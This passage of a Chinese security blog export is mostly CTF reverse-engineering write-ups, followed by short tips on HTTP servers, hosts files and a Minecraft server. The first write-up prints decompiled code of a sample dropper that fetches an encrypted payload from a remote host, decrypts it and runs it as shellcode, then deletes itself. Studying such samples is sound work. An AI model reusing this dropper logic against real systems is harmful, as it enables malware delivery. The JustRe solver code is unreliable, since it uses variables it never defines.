&gt; /60 pushad0043DAB1 . |BE 00504300 mov esi,evil.004350000043DAB6 . |8DBE 00C0FCFF lea edi,dword ptr ds:[esi-0x34000]0043DABC . |57 push edi ; evil.&lt;ModuleEntryPoint&gt;0043DABD . |83CD FF or ebp,-0x10043DAC0 . |EB 10 jmp short evil.0043DAD20043DAC2 |90 nop0043DAC3 |90 nop0043DAC4 |90 nop dd 0019FF54 设置硬件断点 来到0x0043DC2E处 我开始没有分析出来，原来这里0x0043DC3B隐藏着一句jmp命令 0043DC2D . 61 popad0043DC2E . 8D4424 80 lea eax,dword ptr ss:[esp-0x80]0043DC32 &gt; 6A 00 push 0x00043DC34 . 39C4 cmp esp,eax0043DC36 .^ 75 FA jnz short evil.0043DC320043DC38 . 83EC 80 sub esp,-0x800043DC3B . E9 db E90043DC3C . A6 db A60043DC3D . 48 db 48 ; CHAR &apos;H&apos;0043DC3E . FC db FC0043DC3F . FF db FF0043DC40 48 db 48 ; CHAR &apos;H&apos; 手动分析之后得到 0043DC2D . 61 popad0043DC2E . 8D4424 80 lea eax,dword ptr ss:[esp-0x80]0043DC32 &gt; 6A 00 push 0x00043DC34 . 39C4 cmp esp,eax0043DC36 .^ 75 FA jnz short evil.0043DC320043DC38 . 83EC 80 sub esp,-0x800043DC3B - E9 A648FCFF jmp evil.004024E60043DC40 48 db 48 ; CHAR &apos;H&apos; 再F8几下，F4，并且去掉硬件断点（避免反复断）得到 004024E6 E8 BB2D0000 call evil.004052A6004024EB ^ E9 78FEFFFF jmp evil.00402368 这是windows程序最明显的入口，一个call+一个jmp，我们只需要把这个地方作为入口点dump出来即可 接下来就可以用ida来查看各个函数了 程序大致思路： 将evil.exe文件本身复制到temp文件夹中，并且创建evil.docx文件 之后执行temp文件夹中的evil.exe (initialization) 到这里程序会return 6，使得winmain函数跳出，本目录下的evil.exe执行完毕 如果想继续用ollydbg调试的话，需要在mov eax, 6 把 6改为5，以便让程序不要结束 signed int __cdecl sub_401370(int a1)&#123; char v2; // [esp+0h] [ebp-7BCh] char DstBuf; // [esp+4h] [ebp-7B8h] int v4; // [esp+21Ch] [ebp-5A0h] char v5; // [esp+264h] [ebp-558h] int v6; // [esp+370h] [ebp-44Ch] char Src; // [esp+374h] [ebp-448h] char Dst; // [esp+47Ch] [ebp-340h] int v9; // [esp+588h] [ebp-234h] char v10; // [esp+58Ch] [ebp-230h] unsigned int v11; // [esp+59Ch] [ebp-220h] int v12; // [esp+5A0h] [ebp-21Ch] char v13; // [esp+5A4h] [ebp-218h] CHAR File; // [esp+6ACh] [ebp-110h] v6 = 0; v12 = 0; v11 = (*((int (__stdcall **)(int, char *, signed int))&amp;byte_40B01C + 6))(a1, &amp;v13, 261); if ( v11 &gt; 0x105 ) return 1; v11 = (*((int (__stdcall **)(signed int, char *))&amp;byte_40B01C + 5))(261, &amp;Dst); if ( v11 &gt; 0x105 ) return 2; _splitpath(&amp;v13, 0, &amp;File, &amp;Src, &amp;v5); if ( strstr(&amp;v13, \"\\\\Temp\\\\\") ) return 3; strcat_s(&amp;Dst, 0x105u, &amp;Src); if ( v5 != 46 ) strcat_s(&amp;Dst, 0x105u, \".\"); strcat_s(&amp;Dst, 0x105u, &amp;v5); (*((void (__stdcall **)(char *, char *, _DWORD))&amp;byte_40B01C + 4))(&amp;v13, &amp;Dst, 0); strcat_s(&amp;File, 0x105u, &amp;Src); strcat_s(&amp;File, 0x105u, \".docx\"); if ( !sub_4012E0(101, &amp;v6, &amp;v12) ) return 4; v9 = (*((int (__stdcall **)(CHAR *, signed int, signed int, _DWORD, signed int, signed int, _DWORD))&amp;byte_40B01C + 3))( &amp;File, 0x40000000, 1, 0, 2, 128, 0); if ( v9 == -1 ) return 5; (*((void (__stdcall **)(int, int, int, char *, _DWORD))&amp;byte_40B01C + 2))(v9, v6, v12, &amp;v2, 0); (*((void (__stdcall **)(int))&amp;byte_40B01C + 1))(v9); sprintf_s(&amp;DstBuf, 0x218u, \"%s \\\"%s\\\"\", &amp;Dst, &amp;v13); memset(&amp;v4, 0, 0x44u); memset(&amp;v10, 0, 0x10u); v4 = 68; byte_40B01C(0, &amp;DstBuf, 0, 0, 0, 0, 0, 0, &amp;v4, &amp;v10); ShellExecuteA(0, \"open\", &amp;File, 0, 0, 1); return 6; // 只要是正常执行evil.exe文件，都会返回6，所以到这里调试一定会结束&#125; temp目录下的evil.exe开始执行 循环删除当前目录下的evil.exe (sub_401620) 这就是为什么运行一次程序就消失了 LPWSTR *sub_401620()&#123; const WCHAR *v0; // eax LPWSTR *result; // eax int v2; // ST08_4 int pNumArgs; // [esp+4h] [ebp-8h] LPWSTR *v4; // [esp+8h] [ebp-4h] v0 = (const WCHAR *)(*((int (**)(void))&amp;byte_40B01C + 9))(); result = CommandLineToArgvW(v0, &amp;pNumArgs); v4 = result; if ( result &amp;&amp; pNumArgs == 2 )//这个地方删除evil.exe文件 &#123; do &#123; v2 = (*((int (__stdcall **)(LPWSTR))&amp;byte_40B01C + 8))(v4[1]); result = (LPWSTR *)(*((int (__stdcall **)(signed int))&amp;byte_40B01C + 7))(512); &#125; while ( !v2 ); &#125; return result;&#125; 从www.ddctf.com 读取jpg文件（可以通过搭建http服务器解决，上篇文章写过了） void *__cdecl sub_4018F0(unsigned int *a1)&#123; unsigned int v2; // [esp+0h] [ebp-18h] DWORD dwNumberOfBytesRead; // [esp+4h] [ebp-14h] BOOL v4; // [esp+8h] [ebp-10h] void *v5; // [esp+Ch] [ebp-Ch] HINTERNET hFile; // [esp+10h] [ebp-8h] HINTERNET hInternet; // [esp+14h] [ebp-4h] dwNumberOfBytesRead = 0; v2 = 0; hInternet = InternetOpenA(\"DDCTF\", 0, 0, 0, 0); hFile = InternetOpenUrlA(hInternet, \"http://www.ddctf.com/x.jpg\", 0, 0, 0x4000000u, 0); if ( !hFile ) return 0; v5 = malloc(0x100000u); do &#123; v4 = InternetReadFile(hFile, (char *)v5 + v2, 0x100000 - v2, &amp;dwNumberOfBytesRead); if ( !v4 ) break; v2 += dwNumberOfBytesRead; if ( !dwNumberOfBytesRead ) break; &#125; while ( v2 &lt; 0x100000 ); InternetCloseHandle(hFile); if ( v2 &lt;= 0x100000 ) &#123; *a1 = v2; &#125; else &#123; free(v5); v5 = 0; &#125; return v5;&#125; 进入dec1、dec2函数，将jpg文件解密 进入shell函数，在里面进行最后的解密，然后执行这个shell 关于ida的部分我就不贴了，因为这些指令主要是和汇编操作有关 这部分有两种解决方法 一种是调试，将解密的shellcode调试出来 另一种是计算，因为这是一个正向过程，很容易就能把解密函数的c代码复制下来，改改就能用了 这里我是用的调试法 直接在0x401220下断点 由于ida分析，拖黑的部分即为shellcode的最后解密代码，我们就把程序F4到那个地方 这里是才执行完for循环的位置，eax寄存器里面还保存有lpAddress的地址，我们直接Ctrl+g查看对应的内存 果然出现了一段疑似flag的字符串，不过提交后发现答案不对，这是因为这段字符串不全是flag，这其实是一段shellcode，里面夹杂了汇编指令 那个0x68应该就是push指令了 以下是失败的尝试，建议直接跳过 本来跳转没有实现，但是为了执行call edx ，我再一次无耻地改了eip 本以为可以成功跳转到对应的shellcode，然而我失败了，最终手输的flag 贴一个其他师傅的成功截图，我反正是没成功调到那一步的，，，太菜了 https://blog.csdn.net/getsum/article/details/87902382","categories":[{"name":"write-up","slug":"write-up","permalink":"https://mrh1s.top/categories/write-up/"},{"name":"JarvisOJ","slug":"write-up/JarvisOJ","permalink":"https://mrh1s.top/categories/write-up/JarvisOJ/"}],"tags":[{"name":"RE_Static","slug":"RE-Static","permalink":"https://mrh1s.top/tags/RE-Static/"},{"name":"RE_Dynamic","slug":"RE-Dynamic","permalink":"https://mrh1s.top/tags/RE-Dynamic/"},{"name":"packer","slug":"packer","permalink":"https://mrh1s.top/tags/packer/"}],"author":"mrh929"},{"title":"JarvisOJ-findpass","slug":"findpass","date":"2019-06-13T16:00:52.000Z","updated":"2019-06-14T05:54:33.007Z","comments":true,"path":"posts/512d4c5b/","link":"","permalink":"https://mrh1s.top/posts/512d4c5b/","excerpt":"","text":"FindPassFindPass_200.7z 思路用jeb3.0解包apk文件，打开mainactivity，发现一个Getkey函数，思路非常明显 程序读取了src.jpg、fkey、input的内容，并且进行一定的加密操作，获得flag public void GetKey(View arg16) &#123; String input = this.findViewById(0x7F080001).getText().toString(); if(TextUtils.isEmpty(input.trim())) &#123; goto label_57; &#125; char[] fkey = this.getResources().getString(0x7F050003).toCharArray(); int v2 = fkey.length; char[] from_jpg = new char[0x400]; try &#123; new InputStreamReader(this.getResources().getAssets().open(\"src.jpg\")).read(from_jpg); &#125; catch(Exception v3) &#123; v3.printStackTrace(); &#125; int v6; for(v6 = 0; v6 &lt; v2; ++v6) &#123; int v12 = from_jpg[fkey[v6]] % 10; fkey[v6] = v6 % 2 == 1 ? ((char)(fkey[v6] + v12)) : ((char)(fkey[v6] - v12)); &#125; if(input.equals(new String(fkey))) &#123; Toast.makeText(((Context)this), \"恭喜您，输入正确！Flag==flag&#123;Key&#125;\", 1).show(); &#125; else &#123; Toast.makeText(((Context)this), \"not right! lol。。。。\", 1).show(); return; label_57: Toast.makeText(((Context)this), \"请输入key值！\", 1).show(); &#125; &#125; 唯一有一点问题就是那个 char[] fkey = this.getResources().getString(0x7F050003).toCharArray() 经多方询问，最后明白这是一个读取内置字符串的函数，我们可以在 Resources/values/strings.xml 内找到，大多数的安卓软件都会把字符串放在这里面 solvefkey = \"Tr43Fla92Ch4n93\"fromjpg = [0xFF,0xD8,0xFF,0xE0,0x00,0x10,0x4A,0x46,0x49,0x46,0x00,0x01,0x01,0x01,0x00,0x48,0x00,0x48,0x00,0x00,0xFF,0xE1,0x00,0x30,0x45,0x78,0x69,0x66,0x00,0x00,0x4D,0x4D,0x00,0x2A,0x00,0x00,0x00,0x08,0x00,0x01,0x01,0x31,0x00,0x02,0x00,0x00,0x00,0x0E,0x00,0x00,0x00,0x1A,0x00,0x00,0x00,0x00,0x77,0x77,0x77,0x2E,0x6D,0x65,0x69,0x74,0x75,0x2E,0x63,0x6F,0x6D,0x00,0xFF,0xDB,0x00,0x43,0x00,0x03,0x02,0x02,0x03,0x02,0x02,0x03,0x03,0x03,0x03,0x04,0x03,0x03,0x04,0x05,0x08,0x05,0x05,0x04,0x04,0x05,0x0A,0x07,0x07,0x06,0x08,0x0C,0x0A,0x0C,0x0C,0x0B,0x0A,0x0B,0x0B,0x0D,0x0E,0x12,0x10,0x0D,0x0E,0x11,0x0E,0x0B,0x0B,0x10,0x16,0x10,0x11]ans = \"\"for i in range(len(fkey)): t = 0 if(i % 2 == 1): t = ord(fkey[i]) + (fromjpg[ord(fkey[i])] % 10) else: t = ord(fkey[i]) - (fromjpg[ord(fkey[i])] % 10) ans = ans + chr(t)ans = \"flag&#123;\" + ans + \"&#125;\"print(ans)","categories":[{"name":"write-up","slug":"write-up","permalink":"https://mrh1s.top/categories/write-up/"},{"name":"JarvisOJ","slug":"write-up/JarvisOJ","permalink":"https://mrh1s.top/categories/write-up/JarvisOJ/"}],"tags":[{"name":"RE_Static","slug":"RE-Static","permalink":"https://mrh1s.top/tags/RE-Static/"},{"name":"RE_Android","slug":"RE-Android","permalink":"https://mrh1s.top/tags/RE-Android/"}],"author":"mrh929"},{"title":"利用python搭建简易http服务器","slug":"http-server","date":"2019-06-13T12:54:11.000Z","updated":"2019-06-13T12:57:20.367Z","comments":true,"path":"posts/cbf6a417/","link":"","permalink":"https://mrh1s.top/posts/cbf6a417/","excerpt":"","text":"正文原料 linux系统（虚拟机），python 方法首先cd到你想开服务器的目录下，再 sudo python -m SimpleHTTPServer [port] e.g. sudo python -m SimpleHTTPServer 80 这样就在80端口开启了服务器 ubuntu:~/Desktop$ sudo python -m SimpleHTTPServer 80Serving HTTP on 0.0.0.0 port 80 …192.168.133.1 - - [13/Jun/2019 05:05:26] “GET /x.jpg HTTP/1.1” 200 -192.168.133.1 - - [13/Jun/2019 05:05:26] code 404, message File not found192.168.133.1 - - [13/Jun/2019 05:05:26] “GET /favicon.ico HTTP/1.1” 404 -192.168.133.1 - - [13/Jun/2019 05:06:32] “GET /x.jpg HTTP/1.1” 200 -192.168.133.1 - - [13/Jun/2019 05:07:00] “GET /x.jpg HTTP/1.1” 200 -192.168.133.1 - - [13/Jun/2019 05:15:58] “GET /x.jpg HTTP/1.1” 200 -192.168.133.1 - - [13/Jun/2019 05:18:36] “GET /x.jpg HTTP/1.1” 200 -192.168.133.1 - - [13/Jun/2019 05:20:23] “GET /x.jpg HTTP/1.1” 200 -192.168.133.1 - - [13/Jun/2019 05:37:08] “GET /x.jpg HTTP/1.1” 200 -192.168.133.1 - - [13/Jun/2019 05:38:55] “GET /x.jpg HTTP/1.1” 200 - 正常读取到http服务器下面的x.jpg","categories":[{"name":"Tips","slug":"Tips","permalink":"https://mrh1s.top/categories/Tips/"}],"tags":[],"author":"mrh929"},{"title":"如何修改hosts","slug":"hosts","date":"2019-06-13T12:47:01.000Z","updated":"2019-06-13T12:57:20.366Z","comments":true,"path":"posts/b15e7935/","link":"","permalink":"https://mrh1s.top/posts/b15e7935/","excerpt":"","text":"正文 hosts是将一个域名解析到ip地址的一个关联“数据库” 通过手动修改hosts，我们可以将域名解析到自己想要的ip上去 路径 对于win10系统 C:\\Windows\\System32\\drivers\\etc 该文件目录下找到hosts文件，以管理员身份打开。 （否则无法修改） 修改格式在hosts文件末尾添加信息，每行一条 [ip] [host] e.g. 127.0.0.1 www.myhost.com","categories":[{"name":"Tips","slug":"Tips","permalink":"https://mrh1s.top/categories/Tips/"}],"tags":[],"author":"mrh929"},{"title":"在linux上搭建minecraft java版服务器","slug":"minecraft_on_linux","date":"2019-06-09T03:36:09.000Z","updated":"2019-06-09T05:17:14.865Z","comments":true,"path":"posts/6f2d090a/","link":"","permalink":"https://mrh1s.top/posts/6f2d090a/","excerpt":"","text":"如何在Linux上搭建Minecraft服务器 搭建minecraft服务器并不复杂，只需要一些linux的基础操作知识就行了 灵感来自csdn，教程为自己编写. 购买服务器我选择的是阿里云学生机，这样的配置能带好几个人加上几个大mod，几个小伙伴一起玩已经足够了 理论上Ubuntu也可以使用，不过这个教程里面的指令都是基于centOS的 配置服务器查看java版本java --version 如果提示 [root@vultr /]# java –version-bash: java: command not found 则说明没有安装java 安装java sudo yum install java-1.8.0-openjdk 选择目录然后自己找一个想装mc的目录 cd usrmkdir minecraftcd minecraft 获取mc服务器端根据你玩的mc的版本，可以下载相应的jar包 sudo wget https://s3.amazonaws.com/Minecraft.Download/versions/版本号/minecraft_server.版本号.jar 以我的为例，目前支持mod的最新版本是1.12.2 sudo wget https://s3.amazonaws.com/Minecraft.Download/versions/1.12.2/minecraft_server.1.12.2.jar 开启游戏！创建启动脚本在这之前，先创建一个启动脚本，方便后续一键启动 sudo vi start.sh 在start.sh填入如下的内容 sudo java -Xms120m -Xmx160m -jar /usr/minecraft/minecraft_server.1.12.2.jar nogui 其中120m,160m分别是给服务器分配的内存,建议如果是开forege服的话把最大内存调高一点,不然mod带不动 开启开启服务器 bash start.sh 不要着急，这里一定启动不了的，因为你没有同意用户协议 [04:00:32] [Server thread/INFO]: You need to agree to the EULA in order to run the server. Go to eula.txt for more info. 打开eula.txt sudo vi eula.txt 把false改为true eula=true 安装forge现在已经可以启动服务器了，无mod需求的可以直接开服,无需进行下面的步骤 但是我们还是无法运行mod，需要安装forge 可以去官网自行下载，也可以用我的指令 sudo wget https://files.minecraftforge.net/maven/net/minecraftforge/forge/1.12.2-14.23.5.2768/forge-1.12.2-14.23.5.2768-installer.jar 接下来是安装forge java -jar forge-1.12.2-14.23.5.2768-installer.jar nogui --installServer Extracting: /forge-1.12.2-14.23.5.2768-universal.jarTo: /usr/minecraft/./forge-1.12.2-14.23.5.2768-universal.jarThe server installed successfully, you should now be able to run the file forge-1.12.2-14.23.5.2768-universal.jarYou can delete this installer file now if you wish 这个 forge-1.12.2-14.23.5.2768-universal.jar 就是启动forge服务器的启动端 打开start.sh把原版启动程序换为forge的启动程序 sudo vi start.sh 填入 sudo java -Xms120m -Xmx160m -jar /usr/minecraft/forge-1.12.2-14.23.5.2768-universal.jar nogui 开服bash start.sh [04:22:29] [Server thread/INFO] [minecraft/MinecraftServer]: Preparing start region for level 0[04:22:30] [Server thread/INFO] [minecraft/MinecraftServer]: Preparing spawn area: 2%[04:22:32] [Server thread/INFO] [minecraft/MinecraftServer]: Preparing spawn area: 4%[04:22:33] [Server thread/INFO] [minecraft/MinecraftServer]: Preparing spawn area: 7%[04:22:49] [Server thread/INFO] [minecraft/MinecraftServer]: Preparing spawn area: 50%[04:22:50] [Server thread/INFO] [minecraft/MinecraftServer]: Preparing spawn area: 52%[04:22:55] [Server thread/INFO] [minecraft/MinecraftServer]: Preparing spawn area: 64%[04:23:05] [Server thread/INFO] [minecraft/MinecraftServer]: Preparing spawn area: 97%[04:23:06] [Server thread/INFO] [minecraft/DedicatedServer]: Done (39.625s)! For help, type “help” or “?” 其他补充screen开服之后的服务器其实并不稳定,只要你关闭远程连接,mc便会自动结束 为了解决这个问题 就要用到screen工具 sudo yum install screen 在开服之前,先创建一个screen screen -S mc 创建好screen之后再开启mc服务器 当然,如果需要切换出来 , 按一下Ctrl+a 再按一下d即可 [root@vultr ~]# screen -S mc[detached from 7293.mc][root@vultr ~]# 下次还需进入该screen,就不需要创建了,直接 screen -r mc mod要加载mod,将服务器端使用的mod放入/usr/minecraft/mods文件夹,重启mc服务器即可 server.properties配置文件修改,具体请参照官方文档 通常是把pvp,正版检测关闭 还可以限制总加入人数,服务器难度,以及最大高度等等 Java Edition Key Type Default Value Description allow-flight boolean false Allows users to use flight on your server while in Survival mode, if they have a modthat provides flight installed.With allow-flight enabled, griefers will possibly be more common, because it will make their work easier. In Creative mode this has no effect.false - Flight is not allowed (players in air for at least 5 seconds will be kicked).true - Flight is allowed, and used if the player has a fly mod installed. allow-nether boolean true Allows players to travel to the Nether.false - Nether portals will not work.true - The server will allow portals to send players to the Nether. difficulty string easy Defines the difficulty (such as damage dealt by mobs and the way hunger and poison affects players) of the server.If a legacy difficulty number is specified it will be silently converted to a difficulty name.peaceful (0)easy (1)normal (2)hard (3) enable-command-block boolean false Enables command blocks enable-query boolean false Enables GameSpy4 protocol server listener. Used to get information about server. enable-rcon boolean false Enables remote access to the server console. force-gamemode boolean false Force players to join in the default game mode.false - Players will join in the gamemode they left in.true - Players will always join in the default gamemode. gamemode string survival Defines the mode of gameplay.If a legacy gamemode number is specified it will be silently converted to a gamemode name.survival (0)creative (1)adventure (2)spectator (3) generate-structures boolean true Defines whether structures (such as villages) will be generated.false - Structures will not be generated in new chunks.true - Structures will be generated in new chunks.Note: Dungeons will still generate if this is set to false. generator-settings string blank The settings used to customize world generation. See Superflat and Customized for possible settings and examples. hardcore boolean false If set to true, server difficulty is ignored and set to hard and players will be set to spectator mode if they die. level-name string world The “level-name” value will be used as the world name and its folder name. You may also copy your saved game folder here, and change the name to the same as that folder’s to load it instead.Characters such as ‘ (apostrophe) may need to be escaped by adding a backslash before them. level-seed string blank Add a seed for your world, as in Singleplayer.Some examples are: minecraft, 404, 1a2b3c. level-type string default Determines the type of map that is generated.default - Standard world with hills, valleys, water, etc.flat - A flat world with no features, can be modified with generator-settings.largebiomes - Same as default but all biomes are larger.amplified - Same as default but world-generation height limit is increased.buffet - Same as default unless generator-settings is set to a preset. max-build-height integer 256 The maximum height in which building is allowed. Terrain may still naturally generate above a low height limit. max-players integer (0-2147483647) 20 The maximum number of players that can play on the server at the same time. Note that if more players are on the server it will use more resources. Note also, op player connections are not supposed to count against the max players, but ops currently cannot join a full server. However, this can be changed by going to the file called ops.json in your server directory, opening it, finding the op you want the change, and changing the setting called bypassesPlayerLimit to true (the default is false). This means that that op will not have to wait for a player to leave in order to join. Extremely large values for this field result in the client-side user list being broken. max-tick-time integer (0–(2^63 - 1)) 60000 The maximum number of milliseconds a single tick may take before the server watchdog stops the server with the message, A single server tick took 60.00 seconds (should be max 0.05); Considering it to be crashed, server will forcibly shutdown. Once this criterion is met, it calls System.exit(1).-1 - disable watchdog entirely (this disable option was added in 14w32a) max-world-size integer (1-29999984) 29999984 This sets the maximum possible size in blocks, expressed as a radius, that the world border can obtain. Setting the world border bigger causes the commands to complete successfully but the actual border will not move past this block limit. Setting the max-world-size higher than the default doesn’t appear to do anything.Examples:Setting max-world-size to 1000 will allow you to have a 2000x2000 world border.Setting max-world-size to 4000 will give you an 8000 x 8000 world border. motd string A Minecraft Server This is the message that is displayed in the server list of the client, below the name.The MOTD supports color and formatting codes.The MOTD supports special characters, such as “♥”. However, such characters must be converted to escaped Unicode form. An online converter can be found here.If the MOTD is over 59 characters, the server list will likely report a communication error. network-compression-threshold integer 256 By default it allows packets that are n-1 bytes big to go normally, but a packet that nbytes or more will be compressed down. So, lower number means more compression but compressing small amounts of bytes might actually end up with a larger result than what went in.-1 - disable compression entirely0 - compress everythingNote: The Ethernet spec requires that packets less than 64 bytes become padded to 64 bytes. Thus, setting a value lower than 64 may not be beneficial. It is also not recommended to exceed the MTU, typically 1500 bytes. online-mode boolean true Server checks connecting players against Minecraft account database. Only set this to false if your server is not connected to the Internet. Hackers with fake accounts can connect if this is set to false! If minecraft.net is down or inaccessible, no players will be able to connect if this is set to true. Setting this variable to off purposely is called “cracking” a server, and servers that are presently with online mode off are called “cracked” servers, allowing players with unlicensed copies of Minecraft to join.true - Enabled. The server will assume it has an Internet connection and check every connecting player.false - Disabled. The server will not attempt to check connecting players. op-permission-level integer (1-4) 4 Sets the default permission level for ops when using /op. All levels inherit abilities and commands from levels before them.1 - Ops can bypass spawn protection.2 - Ops can use all singleplayer cheats commands (except /publish, as it is not on servers; along with /debug and /reload) and use command blocks. Command blocks, along with Realms owners/operators, have the same permissions as this level.3 - Ops can use most multiplayer-exclusive commands, including /debug, /reload, and commands that manage players (/ban, /op, etc).4 - Ops can use all commands including /stop, /save-all, /save-on, /save-off, /forceload add, and /forceload remove. player-idle-timeout integer 0 If non-zero, players are kicked from the server if they are idle for more than that many minutes.Note: Idle time is reset when the server receives one of the following packets:Click WindowEnchant ItemUpdate SignPlayer DiggingPlayer Block PlacementHeld Item ChangeAnimation (swing arm)Entity ActionClient StatusChat MessageUse Entity prevent-proxy-connections boolean false If the ISP/AS sent from the server is different from the one from Mojang’s authentication server, the player is kickedtrue - Enabled. Server prevents users from using vpns or proxies.false - Disabled. The server doesn’t prevent users from using vpns or proxies. pvp boolean true Enable PvP on the server. Players shooting themselves with arrows will only receive damage if PvP is enabled.true - Players will be able to kill each other.false - Players cannot kill other players (also known as Player versus Environment (PvE)).Note: Indirect damage sources spawned by players (such as lava, fire, TNT and to some extent water, sand and gravel) will still deal damage to other players. query.port integer (1-65534) 25565 Sets the port for the query server (see enable-query). rcon.password string blank Sets the password to rcon. rcon.port integer (1-65534) 25575 Sets the port to rcon. resource-pack string blank Optional URI to a resource pack. The player may choose to use it.Note that the “:” and “=” characters need to be escaped with backslash (), e.g. http://somedomain.com/somepack.zip?someparam=somevalueNote download success/failure is logged by the client, not by the server. resource-pack-sha1 string blank Optional SHA-1 digest of the resource pack, in lowercase hexadecimal. It’s recommended to specify this. This is not yet used to verify the integrity of the resource pack, but improves the effectiveness and reliability of caching. server-ip string blank Set this if you want the server to bind to a particular IP. It is strongly recommended that you leave server-ip blank!Set to blank, or the IP you want your server to run (listen) on. server-port integer (1-65534) 25565 Changes the port the server is hosting (listening) on. This port must be forwarded if the server is hosted in a network using NAT (If you have a home router/firewall). snooper-enabled boolean true Sets whether the server sends snoop data regularly to http://snoop.minecraft.net.false - disable snooping.true - enable snooping. spawn-animals boolean true Determines if animals will be able to spawn.true - Animals spawn as normal.false - Animals will immediately vanish.Tip: if you have major lag, turn this off/set to false. spawn-monsters boolean true Determines if monsters will be spawned.true - Enabled. Monsters will appear at night and in the dark.false - Disabled. No monsters.This setting has no effect if difficulty = 0 (peaceful). If difficulty is not = 0, a monster can still spawn from a Monster Spawner.Tip: if you have major lag, turn this off/set to false. spawn-npcs boolean true Determines whether villagers will be spawned.true - Enabled. Villagers will spawn.false - Disabled. No villagers. spawn-protection integer 16 Determines the radius of the spawn protection as 2x+1. Setting this to 0 will not disable spawn protection. 0 will protect the single block at the spawn point. 1 will protect a 3x3 area centered on the spawn point. 2 will protect 5x5, 3 will protect 7x7, etc. This option is not generated on the first server start and appears when the first player joins. If there are no ops set on the server, the spawn protection will be disabled automatically. use-native-transport boolean true Linux server performance improvements: optimized packet sending/receiving on Linuxtrue - Enabled. Enable Linux packet sending/receiving optimizationfalse - Disabled. Disable Linux packet sending/receiving optimization view-distance integer (2-32) 10 Sets the amount of world data the server sends the client, measured in chunks in each direction of the player (radius, not diameter). It determines the server-side viewing distance. (see Render distance)10 is the default/recommended. If you have major lag, reduce this value.*Note: *A value less than 9 will have big impacts on the mobs’ spawn of your server as it mentionned by the bug MC-2536. white-list boolean false Enables a whitelist on the server.With a whitelist enabled, users not on the whitelist will be unable to connect. Intended for private servers, such as those for real-life friends or strangers carefully selected via an application process, for example.false - No white list is used.true - The file whitelist.json is used to generate the white list.Note: Ops are automatically white listed, and there is no need to add them to the whitelist. enforce-whitelist boolean false Enforces the whitelist on the server.When this option is enabled, users who are not present on the whitelist (if it’s enabled) will be kicked from the server after the server reloads the whitelist file.false - No user will be kicked if not on the whitelist.true - Online users not on the whitelist will be kicked. In versions prior to Java Edition 1.12, the announce-player-achievements boolean property (default true) was used to toggle whether achievementswere broadcasted to all players. This property no longer exists, but if it is set, the announceAdvancements gamerule will automatically be updated to match and the property will be removed.","categories":[{"name":"Tips","slug":"Tips","permalink":"https://mrh1s.top/categories/Tips/"}],"tags":[],"author":"mrh929"},{"title":"让win10系统任务栏变为透明","slug":"transparent","date":"2019-06-07T16:19:11.000Z","updated":"2019-06-08T03:57:07.794Z","comments":true,"path":"posts/36dd5647/","link":"","permalink":"https://mrh1s.top/posts/36dd5647/","excerpt":"","text":"TranslucentTB win10的界面可谓比win7、xp高到不知道哪里去了，然而事物总是有两面性，win10任务栏一直是我们所诟病的一个东西 A lightweight utility that makes the Windows taskbar translucent/transparent. TranslucentTB 效果半透明 全透明 Features 看起来现在加了不少功能 主要的还是改变任务栏透明度 Advanced color picker supporting alpha and live preview to change the taskbar’s color. Taskbar states (choose one - color can be customized on every state except Normal): Blur: Will make the taskbar slightly blurred. 半透明 Clear: Transparent taskbar. 全透明 Normal: Regular Windows style. (as if TranslucentTB was not running) Opaque: No transparency. Fluent: Windows 10 April 2018 update and up only. Will give the taskbar an appearance similar to Microsoft’s Fluent Design guidelines. Dynamic modes (these can be used together and each of them provides a taskbar state and color you can customize): Dynamic Windows: Will change the taskbar to a different appearance if a window is currently maximised. Dynamic Start Menu: Will change the taskbar appearance when the start menu is opened. Dynamic Cortana: Will change the taskbar appearance when Cortana (or the search menu if Cortana is disabled) is open. Dynamic Timeline/Task View: Will change the taskbar apperance when the Timeline (or Task View on older builds) is open. Ability to show or hide the Aero Peek button. Can be customized at will or dynamic. 下载 Microsoft Store （最近添加的） the releases tab（zip压缩包）","categories":[{"name":"Tips","slug":"Tips","permalink":"https://mrh1s.top/categories/Tips/"}],"tags":[],"author":"mrh929"},{"title":"在word中贴出漂亮的代码","slug":"code-to-doc","date":"2019-06-07T16:12:28.000Z","updated":"2019-06-07T16:18:16.445Z","comments":true,"path":"posts/472395fb/","link":"","permalink":"https://mrh1s.top/posts/472395fb/","excerpt":"","text":"用途 如果你正在写word的实验报告，而苦于word的代码显示错位，那你就来对地方了！ 工具 打开这个网页PlanetB; 谷歌搜索syntax highlight code in word documents，检索结果的第一个 步骤​ 打开网页，把需要的代码粘贴进去，然后show highlighted即可 ​","categories":[{"name":"Tips","slug":"Tips","permalink":"https://mrh1s.top/categories/Tips/"}],"tags":[],"author":"mrh929"},{"title":"qwb_JustRe","slug":"qwb-justre","date":"2019-05-26T02:43:14.000Z","updated":"2019-06-13T16:12:46.924Z","comments":true,"path":"posts/2946351e/","link":"","permalink":"https://mrh1s.top/posts/2946351e/","excerpt":"","text":"JustReJustRe.7z 思路程序读入了26位 十六进制数 其中前8为送入eax寄存器 把eax扩展为了16个字节 01234567012345670123456701234567 记作 input 后两位（假设为ab） 填充为了ababababababababab…..ababab，记作 ab 从内存中取16个字节，记作 key1 还从内存取了16个字节，形如00000003000000020000000100000000 记作 key2 key = (ab + key1)^ (input + key2) 并且将结果存在原来key1的位置 依次循环 注意key2第二次 key2’ += key2 ，而不是直接从内存取 接下来的循环 循环了八次，是对从0x405058的32个字节进行处理，每次四个字节 同样 input 01 23 45 67 key 从内存中取四个字节 ab 用89位填充的四个字节 esi 从0x10 开始 一直到0x18 key = (ab + key) ^ (input + esi) 并且将结果存在key的位置 然后 0x405018 和 0x404148的 0x60个字节进行比较，要相等 事实证明，后面这些运算，对于解出input的帮助并不大，我们只需要解出一组input，并且判断它们是否是四个分块都相等即可 dec1 = 0x4364162A031410D2EF95C26D80B899BDenc1 = 0x405004A100000278EC81F0E483EC8B55key1 = 0x00000003000000020000000100000000def FILL(a): #用八九位这一个字节去填充为16字节 return a * 0x01010101010101010101010101010101def DIVIDE(a): for i in range(4): res.append((a &lt;&lt; (32 * i) &amp; 0xffffffffffffffffffffffffffffffff) &gt;&gt; (32 * 3)) return resdef ADD(a, b): a = DIVIDE(a) b = DIVIDE(b) res = 0 for i in range(4): res += ((a[i]+b[i]) &amp; 0xffffffff) &lt;&lt; (32 * (3-i)) return resdef CALC(dec,enc,key,t): return (ADD(FILL(t),dec) ^ enc) - keyfor t in range(100):#枚举第八第九位的所有情况 res = CALC(dec1,enc1,key1,t) if(inpu &amp; 0xffffffff == res &gt;&gt; (3 * 32)): print(hex(CALC(dec1,enc1,key1,t) &gt;&gt; (3*32)),hex(t)) 